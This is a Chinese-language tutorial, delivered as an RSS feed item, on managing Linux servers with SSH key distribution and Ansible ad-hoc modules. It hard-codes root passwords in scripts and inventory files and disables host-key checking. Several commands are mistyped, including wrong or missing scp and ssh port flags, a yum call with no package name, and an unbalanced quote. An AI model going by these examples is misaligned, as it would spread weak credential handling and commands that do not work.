<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Ansible集群批量管理与维护完全指南]]></title>    <link>https://juejin.cn/post/7594389937463181322</link>    <guid>https://juejin.cn/post/7594389937463181322</guid>    <pubDate>2026-01-13T02:51:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389937463181322" data-draft-id="7594420277448245275" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Ansible集群批量管理与维护完全指南"/> <meta itemprop="keywords" content="自动化运维"/> <meta itemprop="datePublished" content="2026-01-13T02:51:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="liux3528"/> <meta itemprop="url" content="https://juejin.cn/user/2701939431971706"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Ansible集群批量管理与维护完全指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2701939431971706/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    liux3528
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:51:40.000Z" title="Tue Jan 13 2026 02:51:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ansible集群批量管理与维护</h2>
<h3 data-id="heading-1">一、集群批量管理-SSHD服务</h3>
<h4 data-id="heading-2">1.openssh服务</h4>
<ul>
<li>
<p>实现加密的远程连接/传输数据</p>
</li>
<li>
<p>openssh-server（sshd，/etc/ssh/sshd——config）</p>
</li>
<li>
<p>openssh-clients（命令，scp，ssh）</p>
</li>
</ul>
<h4 data-id="heading-3">2.telnet vs openssh</h4>





























<table><thead><tr><th/><th>共同点</th><th>区别</th><th>应用场景</th></tr></thead><tbody><tr><td>openssh服务</td><td>远程连接</td><td>数据加密</td><td>默认使用</td></tr><tr><td>telnet 服务</td><td>远程连接</td><td>数据不加密</td><td>升级openssh服务使用</td></tr><tr><td/><td/><td/><td/></tr></tbody></table>
<h5 data-id="heading-4">2.1 telnet服务</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment">#安装</span>
yum -y install telnet-server.x86_64

<span class="hljs-comment">#启动</span>
systemctl <span class="hljs-built_in">disable</span> telnet.socket
systemctl start telnet.socket

<span class="hljs-comment">#xsell连接</span>
telnet 10.0.0.61 23
</code></pre>
<h5 data-id="heading-5">2.2 openssh-server配置文件</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment">#查看软件包是否安装，默认已经安装</span>
rpm -qa |grep openssh

<span class="hljs-comment">#查看openssh-server有哪些配置文件</span>
rpm -ql openssh-server
</code></pre>
<ul>
<li><strong>核心配置文件</strong>：<strong>/etc/ssh/sshd_config</strong></li>
</ul>





































<table><thead><tr><th>openssh服务端配置详解</th><th/></tr></thead><tbody><tr><td>==连接加速==</td><td/></tr><tr><td>UseDNS no</td><td>是否开启反向解析：ip--&gt;域名或主机名</td></tr><tr><td>GSSAPIAuthentication no</td><td>GSS认证功能关闭</td></tr><tr><td>==安全优化项目==</td><td/></tr><tr><td>Port</td><td>默认 22   端口范围1-65535  推荐1w以上的端口</td></tr><tr><td>PermitRootLogin</td><td>禁用root远程登录权限。默认是yes（可以上root远程登录）</td></tr><tr><td>ListenAddress</td><td>监听的地址（后面需要指定本地网卡的地址）可以控制用户只能通过内网访问</td></tr></tbody></table>
<h5 data-id="heading-6">2.3 openssh-clients配置文件</h5>
<h6 data-id="heading-7">01 scp     远程传输工具</h6>
<pre><code class="hljs language-bash" lang="bash">scp  文件/目录  用户名@ip:路径
-r  递归传输
-p	保持属性信息不变
-P	指定端口


scp -rp -P /etc/hostname  root@10.0.0.41:/tmp/
</code></pre>
<h6 data-id="heading-8">02 ssh     远程连接</h6>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment">#使用root用户远程连接到10.0.0.41的22端口</span>
ssh -p 22 root@10.0.0.41

<span class="hljs-comment">#使用root用户远程连接到10.0.0.41的22端口并执行whoami和pwd命令</span>
ssh -P 22 root@10.0.0.41 <span class="hljs-string">"whoami pwd"</span>
</code></pre>
<h6 data-id="heading-9">03 sftp    远程传输文件（一般开发通过图形化界面使用ftp工具）（了解）</h6>
<ul>
<li>
<p>ftp工具的一种</p>
<p>上传大文件，建议使用ftp</p>
</li>
</ul>
<h3 data-id="heading-10">二、集群批量管理-密钥认证</h3>
<h4 data-id="heading-11">1.概述</h4>
<ul>
<li>两个节点，通过密钥形式进行访问，不需要输入密码。</li>
<li>服务要求：一些服务在使用前要求我们做密钥认证。</li>
<li>名字：密钥认证，免密码登录，双击互信</li>
</ul>
<blockquote>
<p>温馨提示：密钥认证是单向的。</p>
</blockquote>
<h4 data-id="heading-12">2.实战创建分发密钥</h4>

















<table><thead><tr><th>角色</th><th/></tr></thead><tbody><tr><td>管理机</td><td>m01</td></tr><tr><td>被管理节点</td><td>backup、nfs01、web01</td></tr></tbody></table>
<h5 data-id="heading-13">2.1 创建密钥对</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment">#创建时也可以不加-t rsa 默认就是rsa</span>
ssh-keygen -t rsa
</code></pre>
<h5 data-id="heading-14">2.2 分发密钥</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment">#给backup服务器分发密钥 存放在远程主机/root/.ssh/authorized_keys</span>
ssh-copy-id -i /root/.ssh/id_rsa.pub  root@10.0.0.41
</code></pre>
<h5 data-id="heading-15">2.3 连接测试</h5>
<pre><code class="hljs language-bash" lang="bash">ssh root@10.0.0.41 hostname -I

[root@m01 ~]<span class="hljs-comment"># ssh root@10.0.0.41 hostname -I</span>
10.0.0.41 172.16.1.41 
</code></pre>
<h4 data-id="heading-16">3.自动化分发与创建密钥对</h4>
<h5 data-id="heading-17">3.1 自动化创建密钥</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment">#-f指定路径  -P 密码短语，设置为空</span>
ssh-keygen -f ~/.ssh/id_rsa -P <span class="hljs-string">''</span>
</code></pre>
<h5 data-id="heading-18">3.2 自动化分发公钥</h5>
<ul>
<li><strong>阻碍1</strong>：密码  <strong>-p</strong> 指定密码</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#安装密码提供工具</span>
yum -y install sshpass
<span class="hljs-comment">#使用-p 指定密码</span>
sshpass -p12366 ssh 10.0.0.41 hostname -I

<span class="hljs-comment">#sshpass与ssh-copy-id分发公钥</span>
sshpass -p12366 ssh-copy-id 10.0.0.41
</code></pre>
<ul>
<li><strong>阻碍2</strong>：第一次连接的时候提示的yes和no，主机密钥信息检查，输入yes后存放到~/.ssh/known_hosts</li>
</ul>
<blockquote>
<p>温馨提示：sshpass与ssh-copy-id分发公钥 第一次连接，提示yes/no，sshpass就失效了。</p>
<p>解决思路：临时取消即可，连接的时候不检查主机信息。
-o StrictHostKeyCheckin=no 临时不检查主机信息.</p>
<p>-p22 指定主机端口为22</p>
</blockquote>
<pre><code class="hljs language-sh" lang="sh">sshpass -p12366 ssh-copy-id -i ~/.ssh/id_rsa.pub -oStrictHostKeyChecking=no 10.0.0.31
</code></pre>
<h5 data-id="heading-19">3.3自动化创建与分发   脚本</h5>
<ul>
<li>编辑   vim /server/scripts/fenfa.sh</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment">#author:liux</span>
<span class="hljs-comment">#desc:自动话创建密钥与分发密钥</span>

<span class="hljs-comment">#0.变量</span>
ips=<span class="hljs-string">"7 31 41"</span>
<span class="hljs-comment">#1.创建密钥对（未来可以加入判断）</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"创建密钥对"</span>
ssh-keygen -f /root/.ssh/id_rsa -P <span class="hljs-string">''</span>
<span class="hljs-comment">#2.分发公钥</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"分发公钥"</span>
<span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> <span class="hljs-variable">$ips</span>
<span class="hljs-keyword">do</span>
   sshpass -p12366 ssh-copy-id -i /root/.ssh/id_rsa.pub  -oStrictHostKeyChecking=no 10.0.0.<span class="hljs-variable">$ip</span>
<span class="hljs-keyword">done</span>

<span class="hljs-comment">#3.检查</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"检查密钥认证"</span>
<span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> <span class="hljs-variable">$ips</span>
<span class="hljs-keyword">do</span> 
   ssh 10.0.0.<span class="hljs-variable">$ip</span> hostname -I
<span class="hljs-keyword">done</span>

</code></pre>
<h3 data-id="heading-20">三、集群批量管理-Ansible</h3>
<pre><code class="hljs language-sh" lang="sh">ansible-doc -s	模块名  <span class="hljs-comment">#命令查看帮助文档</span>
<span class="hljs-comment">#官网查看帮助文档</span>
https://docs.ansible.com/ansible/latest/collections/ansible/builtin/index.html<span class="hljs-comment">#plugins-in-ansible-builtin</span>
</code></pre>
<h4 data-id="heading-21">1.Ansible概述</h4>
<blockquote>
<p>Ansible是一个自动化<strong>统一配置管理工具</strong>，自动化主要体现在Ansible集成了丰富模块以及功能组件，可以通过一个命令完成一系列的操作，进而能减少重复性的工作和维护成本，可以提高工作效率</p>
</blockquote>
<ul>
<li>自动化运维：批量管理，批量分发，批量执行，维护......</li>
<li>python写的</li>
<li>ansible 轻量级，大规模环境下只通过ssh会很慢，串行的</li>
</ul>





















<table><thead><tr><th>批量管理工具</th><th/></tr></thead><tbody><tr><td>==Ansible==</td><td>无客户端，基于ssh进行管理与维护</td></tr><tr><td>saltstack</td><td>需要安装客户端，基于ssh进行管理</td></tr><tr><td>terraform</td><td>批量管理基础设施（批量创建100台公有云）</td></tr></tbody></table>
<h4 data-id="heading-22">2.Ansible管理架构</h4>
<ul>
<li>Inventory 主机清单：被管理主机的ip列表，分类。</li>
<li>ad-hoc模式 命令行批量管理（使用ans模块），临时任务。</li>
<li><strong>playbook 剧本模式</strong>：类似于把操作写成脚本，可以重复运行该脚本。</li>
</ul>
<h4 data-id="heading-23">3.Ansible安装及修改配置</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment">#1.安装epel源</span>
[root@m01 ~]<span class="hljs-comment"># wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo</span>

<span class="hljs-comment">#2.安装Ansible</span>
yum -y install ansible

ansible --version

[root@m01 ~]<span class="hljs-comment"># vim /etc/ansible/ansible.cfg</span>
[root@m01 ~]<span class="hljs-comment"># egrep -vn '^$|#' /etc/ansible/ansible.cfg</span>
10:[defaults]
71:host_key_checking = False
111:log_path = /var/log/ansible.log
327:[inventory]
340:[privilege_escalation]
346:[paramiko_connection]
370:[ssh_connection]
431:[persistent_connection]
445:[accelerate]
460:[selinux]
469:[colors]
485:[diff]
</code></pre>
<h4 data-id="heading-24">4.Ansible-Inventory 主机清单</h4>
<ul>
<li>
<p>分组进行管理</p>
</li>
<li>
<p>子组进行管理</p>
</li>
<li>
<p>默认在/etc/ansible/hosts</p>
</li>
<li>
<p>在指定目录创建hosts，需要在运行ansible命令的时候，通过-i选项指定hosts文件</p>
</li>
</ul>
<h5 data-id="heading-25">4.1 主机清单必会格式</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment">#编辑hosts文件，添加需要管理的服务器，并给服务器分组</span>
[root@m01 ~]<span class="hljs-comment"># vim /etc/ansible/hosts </span>
[web]
172.16.1.7
[backup]
172.16.1.41
[nfs]
172.16.1.31

<span class="hljs-comment">#invertory主机清单定义方式</span>
<span class="hljs-comment">#方法一: 单台主机定义</span>
[root@ansible ~]<span class="hljs-comment"># cat /etc/ansible/hosts </span>
10.0.0.7 ansible_ssh_port=22 ansible_ssh_user=root ansible_ssh_pass=<span class="hljs-string">'1'</span>

<span class="hljs-comment">#方式二、IP+端口+用户+密码</span>
[webs]
10.0.0.7 ansible_ssh_port=22 ansible_ssh_user=root ansible_ssh_pass=<span class="hljs-string">'1'</span>
10.0.0.8 ansible_ssh_port=22 ansible_ssh_user=root ansible_ssh_pass=<span class="hljs-string">'1'</span>

<span class="hljs-comment">#方式三 配置别名方</span>
[root@ansible ~]<span class="hljs-comment"># cat /etc/ansible/hosts </span>
[webs]
web01 ansible_ssh_host=10.0.0.7 ansible_ssh_port=22 ansible_ssh_user=root ansible_ssh_pass=<span class="hljs-string">'1'</span>

web02 ansible_ssh_host=10.0.0.8 ansible_ssh_port=22 ansible_ssh_user=root ansible_ssh_pass=<span class="hljs-string">'1'</span>

<span class="hljs-comment">#方式四 变量使用</span>
[root@ansible ~]<span class="hljs-comment"># cat /etc/ansible/hosts</span>
[webs]
web01 ansible_ssh_host=10.0.0.7 
web02 ansible_ssh_host=10.0.0.8
[webs:vars]
ansible_ssh_port=22 
ansible_ssh_user=root 
ansible_ssh_pass=<span class="hljs-string">'1'</span>
</code></pre>
<ul>
<li>ansible测试三台服务器是否可以ping通</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">ansible all -m ping

[root@m01 ~]<span class="hljs-comment"># ansible all -m ping</span>
172.16.1.7 | SUCCESS =&gt; {
    <span class="hljs-string">"ansible_facts"</span>: {
        <span class="hljs-string">"discovered_interpreter_python"</span>: <span class="hljs-string">"/usr/bin/python"</span>
    }, 
    <span class="hljs-string">"changed"</span>: <span class="hljs-literal">false</span>, 
    <span class="hljs-string">"ping"</span>: <span class="hljs-string">"pong"</span>
}
172.16.1.31 | SUCCESS =&gt; {
    <span class="hljs-string">"ansible_facts"</span>: {
        <span class="hljs-string">"discovered_interpreter_python"</span>: <span class="hljs-string">"/usr/bin/python"</span>
    }, 
    <span class="hljs-string">"changed"</span>: <span class="hljs-literal">false</span>, 
    <span class="hljs-string">"ping"</span>: <span class="hljs-string">"pong"</span>
}
172.16.1.41 | SUCCESS =&gt; {
    <span class="hljs-string">"ansible_facts"</span>: {
        <span class="hljs-string">"discovered_interpreter_python"</span>: <span class="hljs-string">"/usr/bin/python"</span>
    }, 
    <span class="hljs-string">"changed"</span>: <span class="hljs-literal">false</span>, 
    <span class="hljs-string">"ping"</span>: <span class="hljs-string">"pong"</span>
}

</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82d6d6341e374807a5872c5f6471f0db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=UO3QhLF4IWL6Up%2BrZ%2FZTlwGhAqc%3D" alt="image-20230327221008704" loading="lazy"/></p>
<blockquote>
<p>主机清单分组详解：</p>
<p>​    	需要我们进行分组：按照层次进行分组，按照功能/业务进行分组</p>
</blockquote>
<h5 data-id="heading-26">4.2 子组（给组再分组）</h5>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">data:children</span>]
backup
nfs
</code></pre>
<h5 data-id="heading-27">4.3小结</h5>
<ul>
<li>帮助文档</li>
</ul>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.ansible.com%2F" target="_blank" title="https://docs.ansible.com/" ref="nofollow noopener noreferrer">Ansible Documentation</a></p>
</blockquote>
<h4 data-id="heading-28">5.Ansible必知必会模块-ad-hoc</h4>
<ul>
<li>ansible模块 modules</li>
<li>ansible通过各种模块实现批量管理</li>
<li>一般来说这些模块对应着Linux里面的基本操作或服务管理</li>
<li>找出Linux场景操作对应的模块即可。</li>
</ul>









































































<table><thead><tr><th>模块分类</th><th/></tr></thead><tbody><tr><td><strong>命令和脚本模块</strong></td><td><strong>command模块 默认的模块，执行简单命令，不支持特殊符号</strong></td></tr><tr><td/><td><strong>shell模块 执行命令，支持特殊符号</strong></td></tr><tr><td/><td><strong>script模块  分发脚本并执行</strong></td></tr><tr><td><strong>文件</strong></td><td><strong>file 创建目录，文件，软链接</strong></td></tr><tr><td/><td><strong>copy 远程分发文件，修改权限，所有者，备份</strong></td></tr><tr><td>服务</td><td><strong>systemd服务管理</strong></td></tr><tr><td/><td>service 服务管理（了解）</td></tr><tr><td>软件包</td><td>yum源  yum_repository</td></tr><tr><td/><td><strong>yum 命令</strong></td></tr><tr><td/><td>get_url下载软件</td></tr><tr><td>系统管理</td><td>mount 挂载</td></tr><tr><td/><td>cron 定时任务</td></tr><tr><td>用户管理</td><td>user 管理用户</td></tr><tr><td/><td>group 管理用户组</td></tr><tr><td>调式模块</td><td>ping 模块检查 ansible与其他节点连通性</td></tr><tr><td/><td>debug 用于检查/显示 变量</td></tr></tbody></table>





























<table><thead><tr><th>ansible</th><th/><th/><th/></tr></thead><tbody><tr><td>ansible</td><td>主机清单（all/web/172.16.1.7）</td><td>-m 模块</td><td>-a 模块中的选项</td></tr><tr><td>-m 指定模块</td><td/><td/><td/></tr><tr><td>-a 指定模块中的选项</td><td/><td/><td/></tr></tbody></table>
<h5 data-id="heading-29">5.1命令与脚本类模块</h5>
<h6 data-id="heading-30">a）command模块</h6>
<ul>
<li>
<p>ans 默认的模块，适用于执行简单的命令，不支持特殊符号（ -m command 可以不加）</p>
</li>
<li>
<p>批量获取所有主机的主机名</p>
</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"> ansible all -m <span class="hljs-built_in">command</span> -a <span class="hljs-string">'hostname'</span>
 ansible all  -a <span class="hljs-string">'ip a s eth0'</span>
</code></pre>
<h6 data-id="heading-31">b）shell模块</h6>
<ul>
<li>与command模块相似，但支持特殊符号</li>
<li>批量获取ip地址</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">ansible all -m shell -a <span class="hljs-string">"ip a s eth0 |awk -F '[ /]+' 'NR==3{print \$3}'"</span>
</code></pre>
<blockquote>
<p>温馨提示：</p>
<p>shell模块不推荐较为复杂的指令，如果需要执行可放在脚本中执行。</p>
</blockquote>
<h6 data-id="heading-32">c）script模块</h6>
<ul>
<li>
<p>分发脚本（传输脚本）</p>
</li>
<li>
<p>运行脚本</p>
</li>
<li>
<p>批量执行脚本获取主机信息</p>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 ~]<span class="hljs-comment"># vim /server/scripts/ansible.sh</span>
<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">#author :liux</span>
<span class="hljs-comment">#desc:系统巡检脚本</span>

hostname
hostname -I
<span class="hljs-built_in">uptime</span>
<span class="hljs-built_in">whoami</span>
<span class="hljs-built_in">date</span> +%F


ansible all -m script -a <span class="hljs-string">'/server/scripts/ansible.sh'</span>
</code></pre>
<h5 data-id="heading-33">5.2 文件相关模块</h5>
<h6 data-id="heading-34">a）file模块</h6>
<ul>
<li>管理文件，管理目录，创建软链接</li>
<li>查看帮助文档ansible-doc -s file</li>
</ul>





































<table><thead><tr><th>file模块</th><th/></tr></thead><tbody><tr><td>==path==</td><td>路径（目录、文件），必须要写</td></tr><tr><td>src</td><td>源文件一般用于link（创建软链接模式） 用于指定源文件</td></tr><tr><td>==state==</td><td>状态（模式）<br/>state=directory   创建目录<br/>state=file（默认） 更新文件，如果文件不存在也不创建<br/>state=link 创建软链接<br/>state=touch 创建文件<br/>state=absent 删除（:warning:注意：如果是目录，将递归删除目录）</td></tr><tr><td/><td/></tr><tr><td>mode</td><td>mode=755 创建并修改权限</td></tr><tr><td>owner</td><td>owner=root</td></tr><tr><td>group</td><td>group=root</td></tr></tbody></table>
<ul>
<li>创建文件</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#创建</span>
ansible all -m file -a <span class="hljs-string">'path=/opt/liux.txt state=touch'</span>
<span class="hljs-comment">#查看</span>
ansible all -a <span class="hljs-string">'ls -l /opt/liux.txt'</span>
</code></pre>
<ul>
<li>创建目录</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">ansible all -m file  -a <span class="hljs-string">'path=/app/ state=directory'</span>
</code></pre>
<ul>
<li>创建软链接  /etc/hosts创建软链接到/opt下</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">ln</span> -s /etc/hosts  /opt/hosts
ansible all -m file -a <span class="hljs-string">'src=/etc/hosts path=/opt/hosts state=link'</span>
</code></pre>
<ul>
<li>创建/ans-backup 目录 所有者是liux</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">ansible all -m file  -a <span class="hljs-string">'path=/app/ owner=liux group=liux mode=700 state=directory'</span>
</code></pre>
<ul>
<li>删除</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">ansible all -m file  -a <span class="hljs-string">'path=/app/ state=absent’
</span></code></pre>
<h6 data-id="heading-35">b）copy模块</h6>
<ul>
<li>批量分发：scp</li>
</ul>

































<table><thead><tr><th>copy模块</th><th/></tr></thead><tbody><tr><td>==src==</td><td>source 源文件</td></tr><tr><td>==dest==</td><td>destination 目标文件</td></tr><tr><td>backup</td><td>backup=yes 则会在覆盖前备份</td></tr><tr><td>mode</td><td>mode=755 创建并修改权限</td></tr><tr><td>owner</td><td>owner=root</td></tr><tr><td>group</td><td>group=root</td></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh">ansible all -m copy -a <span class="hljs-string">'src=/etc/hosts dest=/etc/hosts backup=yes'</span>
</code></pre>
<h6 data-id="heading-36">c）lineinfile</h6>
<ul>
<li>修改文件内容</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#查看帮助文档</span>
ansible-doc -s lineinfile
</code></pre>
<h5 data-id="heading-37">5.3服务管理-sysmtemd</h5>
<ul>
<li>相当于是sysmtemctl命令：
<ul>
<li>开启/关闭/重启服务</li>
<li>开机自启动</li>
</ul>
</li>
</ul>

























<table><thead><tr><th>systemd模块</th><th/></tr></thead><tbody><tr><td>name</td><td>用于指定服务名称</td></tr><tr><td>enabled</td><td>yes开启自启动</td></tr><tr><td>state</td><td>表示服务开、关、重启<br/>state=started 开启<br/>state=stopped 关闭<br/>state=reloaded 重读配置文件（服务支持）<br/>state=restarted 重启（关闭再开启）</td></tr><tr><td>daemon-reload</td><td>yes 是否重新加载对应的服务管理配置文件（用于书写systemctl配置文件）</td></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#启动服务</span>
ansible all -m systemd -a <span class="hljs-string">'name=crond enabled=yes state=started'</span>

<span class="hljs-comment">#关闭服务</span>
ansible all -m systemd -a <span class="hljs-string">'name=firewalld enabled=no state=stopped'</span>

<span class="hljs-comment">#重启ssh服务</span>
ansible all -m systemd -a <span class="hljs-string">'name=sshd state=reloaded '</span>
</code></pre>
<h5 data-id="heading-38">5.3 软件管理</h5>
<ul>
<li>yum模块</li>
<li>get_url模块</li>
<li>yum_repository模块  yum源配置模块</li>
</ul>
<h6 data-id="heading-39">a）yum模块</h6>





















<table><thead><tr><th>yum命令</th><th/></tr></thead><tbody><tr><td>name</td><td>指定软件包名字</td></tr><tr><td>state</td><td>installed 安装（present）默认<br/>removed 删除 （absent）<br/>lastest 安装或更新</td></tr><tr><td>update_cache</td><td>可以设置为no加加速</td></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh">ansible all -m yum -a <span class="hljs-string">'tree,htop update_cache=no'</span>
</code></pre>
<h6 data-id="heading-40">b）get_url模块</h6>
<ul>
<li>wget命令  所有主机能访问网络才行</li>
<li>推荐在管理节点下载好，使用copy分发即可。</li>
</ul>





















<table><thead><tr><th>get_url模块</th><th/></tr></thead><tbody><tr><td>url</td><td>指定下载的地址</td></tr><tr><td>dest</td><td>下载到哪个目录</td></tr><tr><td/><td/></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh">https: ˌ tengine.taobao.org/download/tengine-2.3.3.tar.gz下载到/app/tools目录下面
ansible all -m file -a <span class="hljs-string">'path=/app/tools/ state=directory'</span>
